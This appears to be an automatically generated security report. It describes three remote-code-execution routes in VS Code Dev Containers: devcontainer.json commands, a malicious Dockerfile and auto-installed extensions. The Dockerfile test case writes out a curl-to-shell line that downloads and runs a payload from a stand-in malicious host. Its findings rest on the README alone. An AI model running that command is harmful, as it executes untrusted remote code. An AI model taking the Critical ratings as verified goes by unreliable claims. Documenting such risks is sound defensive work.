# VS Code Dev Containers Security Vulnerabilities

## Remote Code Execution via Malicious Dev Container Configuration  
  
**Description:**  
A threat actor can supply a manipulated repository that includes a modified `.devcontainer/devcontainer.json` file.  
In this configuration file, fields such as `postCreateCommand` or `postStartCommand` can be set to execute arbitrary commands.  
When a victim opens the repository using the VS Code Dev Containers extension, the extension automatically loads and executes these commands as part of container setup.  
Step by step, the attacker "injects" a payload into the configuration; the victim then triggers it by using the "Clone in Container Volume…" or "Open Folder in Container…" workflow.

**Impact:**  
Arbitrary commands are executed within the container.  
If container boundaries are weak or if host escalation is possible (e.g., via misconfigured container privileges), this may lead to broader system compromise or data exfiltration.

**Vulnerability Rank:** Critical  

**Currently Implemented Mitigations:**  
The project trusts the repository's configuration files by design. There is no explicit sanitization or integrity verification performed on `.devcontainer/devcontainer.json` within the project.  
The security model assumes that only trusted repositories will be used.

**Missing Mitigations:**  
Input validation or sanitization of command fields within configuration files.  
Integrity verification (e.g., checksum or digital signature) to ensure that configuration files have not been tampered with.  
A whitelist or approval process for commands that are auto-executed.

**Preconditions:**  
The victim must clone/open a repository provided by an attacker through the VS Code Dev Containers extension.  
The repository must include a manipulated `.devcontainer/devcontainer.json` file containing arbitrary command payloads.

**Source Code Analysis:**  
The README clearly instructs that VS Code will "automatically pick up" and execute settings from `.devcontainer/devcontainer.json` (for example, running `postCreateCommand`).  
Although the actual configuration file is not shown in the provided files, the documented workflow reveals that the extension does not perform additional validation on the commands defined in the file.  
Thus, if an attacker replaces or modifies that file, the extension directly passes unsanitized values to the container runtime for execution.

**Security Test Case:**  
**Step 1:** Create a test repository that includes a `.devcontainer/devcontainer.json` file. In this file, set the `postCreateCommand` (or equivalent field) to a command such as:  
`echo "Malicious payload executed" > /tmp/poc.txt; <malicious_command>`  
**Step 2:** Use the VS Code Dev Containers extension to open this repository (via "Clone in Container Volume…" or "Open Folder in Container…").  
**Step 3:** Monitor the container build and startup process and check inside the container for evidence that the malicious command was executed (for example, verify that `/tmp/poc.txt` exists and contains the expected text).  
**Step 4:** Conclude that arbitrary code is executed if the injected payload runs as part of the container startup.

## Remote Code Execution via Malicious Dockerfile  

**Description:**  
The VS Code Dev Containers workflow relies on files provided in the repository to build the development container image.  
An attacker can supply a modified `Dockerfile` that contains arbitrary commands (using Docker's `RUN` instructions) designed to execute malicious code during the image build process.  
When a victim opens the repository, the Docker build process will automatically run the commands in the `Dockerfile`.

**Impact:**  
Arbitrary code is executed during the Docker build phase, potentially altering the container's environment (e.g., installing backdoors or malicious software).  
Even if the execution is initially confined to the container, privilege escalation or misconfigurations may allow later host compromise.

**Vulnerability Rank:** Critical  

**Currently Implemented Mitigations:**  
The project assumes that the repository comes from a trusted source and relies on the isolation provided by containerization.  
There is no built-in mechanism to verify or lint the `Dockerfile` content.

**Missing Mitigations:**  
Implementation of Dockerfile linting or static analysis to flag suspicious commands.  
Enforcing a policy of configuration integrity checks (e.g., signing the Dockerfile).  
A whitelist of allowed Dockerfile instructions or an approval step before auto-building.

**Preconditions:**  
The victim must open a repository that contains a manipulated `Dockerfile`.  
The Docker build process must use that `Dockerfile` without manual review, meaning the victim trusts the repository's content.

**Source Code Analysis:**  
While the provided files do not include the `Dockerfile`, the README explains that users can "open the repository in an isolated Docker volume" and that the dev container is built automatically.  
This indicates that the Docker build process is fully automated and will run any instructions in the provided `Dockerfile`.  
The absence of built-in file integrity or content sanitization means that an attacker's malicious modification would be executed.

**Security Test Case:**  
**Step 1:** Prepare a test repository containing a `Dockerfile` with a malicious payload. For example, include a line such as:  
`RUN echo "Injected malicious command executed" > /tmp/poc.txt && curl -fsSL http://malicious.server/payload | sh`  
**Step 2:** Open the repository using the VS Code Dev Containers extension so that the Docker image builds based on the supplied `Dockerfile`.  
**Step 3:** Observe the Docker build output and then inspect the resulting container to verify if `/tmp/poc.txt` exists and confirm that the payload command was executed.  
**Step 4:** A successful execution confirms that the Dockerfile's arbitrary commands run during the build process.

## Code Injection via Malicious Extension Auto-Installation  

**Description:**  
The development container setup defined in the project automatically installs certain VS Code extensions (for example, the Python extension and Code Spell Checker) as specified in configuration (e.g., in `.devcontainer/devcontainer.json`).  
A threat actor may manipulate the repository to include a modified configuration file that lists untrusted or attacker-controlled extension identifiers.  
When the container starts, the VS Code extension auto-installation mechanism will fetch and load these extensions without robust validation of their legitimacy, potentially executing malicious code.

**Impact:**  
If a malicious extension is installed, it could execute arbitrary code within the VS Code extension host or trigger further actions on the victim's system.  
This may lead to data exfiltration, unauthorized system control, and persistent compromise in the VS Code environment.

**Vulnerability Rank:** Critical  

**Currently Implemented Mitigations:**  
The official repository documentation lists trusted extension identifiers (such as `"ms-python.python"`), and under normal circumstances, the VS Code Marketplace enforces certain checks.  
However, the configuration file itself is trusted blindly by the auto-installation process when opening a repository.

**Missing Mitigations:**  
A validation mechanism (such as a whitelist) to ensure that only approved and mutually verified extension identifiers are auto-installed.  
Integration of signature or integrity checks on the extension list specified in the configuration file.

**Preconditions:**  
The victim must open a repository with a tampered `.devcontainer/devcontainer.json` where the list of extensions is replaced or augmented with malicious entries.  
The automatic extension installation feature must execute without prompting for additional confirmation or validating the extension source.

**Source Code Analysis:**  
The README instructs that "the Python extension is already installed in the container" as it is referenced in the dev container configuration.  
This auto-installation mechanism does not appear to perform additional verification on the extension identifiers provided in the repository's configuration.  
Consequently, if an attacker substitutes a trusted extension with a malicious one (or adds one), the VS Code extension host will install and load it automatically.

**Security Test Case:**  
**Step 1:** Create a test repository with a modified `.devcontainer/devcontainer.json` file that includes an attacker-controlled malicious extension identifier in the `"extensions"` field.  
**Step 2:** Open the repository using the VS Code Dev Containers extension.  
**Step 3:** Monitor the auto-installation process to confirm that the malicious extension is downloaded and installed.  
**Step 4:** Validate that the malicious extension executes its payload (for example, by having it create a recognizable file or output a log message) upon activation within the VS Code environment.
